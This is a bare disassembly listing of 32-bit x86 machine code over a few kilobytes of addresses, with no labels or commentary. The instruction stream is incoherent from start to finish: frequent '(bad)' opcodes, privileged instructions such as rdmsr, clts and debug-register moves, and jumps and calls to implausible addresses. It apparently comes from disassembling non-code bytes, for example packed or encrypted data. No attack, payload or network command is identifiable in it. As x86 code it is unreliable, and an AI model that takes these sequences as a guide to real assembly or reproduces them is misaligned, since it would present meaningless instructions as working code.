  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
